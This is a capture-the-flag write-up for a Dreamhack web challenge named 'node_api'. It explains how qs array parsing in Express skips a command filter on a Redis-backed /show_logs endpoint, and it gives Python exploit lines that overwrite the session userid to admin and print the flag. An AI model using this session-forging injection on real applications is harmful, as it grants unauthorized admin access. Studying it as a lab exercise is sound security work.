## node_api  

<img src="images/chall.png" width=600>

We are given a simple app that uses Redis for authentication.  

```js
const redis = require('redis');
const redis_client = redis.createClient();

const connectRedis = require('connect-redis');

const RedisStore = connectRedis(session);
const sess = {
    resave: false,
    secret: 'dreamhack',
    store: new RedisStore({
        client: redis_client
    }),
};

const db = {
    'guest': 'guest',
    'dreamhack': '1234',
    'ADMIN': 'this_is_admin?'
}

function login(user) {
    return user.userpw && db[user.userid] == user.userpw;
}

app.use(session(sess));
redis_client.set('log_info', 'KEY: "log_" + new Date().getTime(), VALUE: userid');

...

app.get('/login', function(req, res) {
    redis_client.set('log_' + new Date().getTime(), 'userid: ' + req.session.userid);
    if (login(req.query)) {
        req.session.userid = req.query.userid;
        res.send('<script>alert("login!");history.go(-1);</script>');
    } else {
        res.send('<script>alert("login failed!");history.go(-1);</script>');
    }
});
```

There is a `/flag` endpoint that requires us to be authenticated as `admin`.  

```js
app.get('/flag', function(req, res) {
    if (req.session.userid === "admin") {
        res.send(FLAG)
    } else {
        res.send('hello ' + req.session.userid);
    }
});
```

The main vulnerability lies in the `/show_logs` endpoint, which allows us to execute Redis commands. If we were able to bypass these checks, we could potentially run a `SET` command to modify our own session cookie to have the `admin` userid.  

However, the endpoint enforces some checks that attempts to restrict us to `GET` commands only. It splits our `log_query` parameter by `/`, then forces the first part of the command to `get`.  

```js
app.get('/show_logs', function(req, res) {
    // var log_query=get/log_info
    var log_query = req.query.log_query;
    try {
        log_query = log_query.split('/');
        if (log_query[0].toLowerCase() != 'get') {
            log_query[0] = 'get';
        }
        log_query[1] = log_query.slice(1)
    } catch (err) {
        // Todo
        // Error(403);
    }
    try {
        redis_client.send_command(log_query[0], log_query[1], function(err, result) {
            if (err) {
                res.send('ERR');
            } else {
                res.send(result);
            }
        })
    } catch (err) {
        res.send('try /show_logs?log_query=get/log_info')
    }
});
```

Looking at package.json, we can see that the app uses `express@4.17.1`. This is huge because express `4.x` use the `qs` module by default to parse URL parameters as JavaScript objects.  

We can abuse `qs` to bypass the checks in `/show_logs`, but more on that later.  

```json
{
  "name": "node_api",
  "version": "1.0.0",
  "description": "node_api",
  "main": "main.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "dependencies": {
    "connect-redis": "^4.0.4",
    "express": "^4.17.1",
    "express-session": "^1.17.0",
    "redis": "^3.0.2"
  }
}
```

First, we need to get our session ID. We can do this by fetching the `connect.sid` cookie used by `express-session` and extracting our session ID from it.  

After that, we can use `/show_logs` to run a normal `GET` command on our session ID.  

```python
cookie = unquote(res.cookies['connect.sid'])
sess = cookie[cookie.index(':') + 1:].split(".")[0]


res = s.get(f'{url}/show_logs?log_query=get/sess:{sess}')
payload = json.loads(res.text)
```

This will return the following payload, showing the extract structure of our cookie.  

```json
{"cookie":{"originalMaxAge":null,"expires":null,"httpOnly":true,"path":"/"},"userid":"guest"}
```

We can then abuse `qs` to pass in our Redis `SET` command as an array. Now, `/show_log` will attempt to run `.split()` on our array parameter, which will silently fail and skip the check entirely.  

`/show_log` will then execute our command and modify our session `userid` to `admin`, and we can then visit `/flag` to get the flag.  

```python
payload = {"cookie":{"originalMaxAge":None,"expires":None,"httpOnly":True,"path":"/"},"userid":"admin"}

res = s.get(f'{url}/show_logs?log_query[0]=set&log_query[1][]=sess:{sess}&log_query[1][]={json.dumps(payload)}')
```

Flag: `DH{c5adc4033f8b685d84d56423082f21ac}`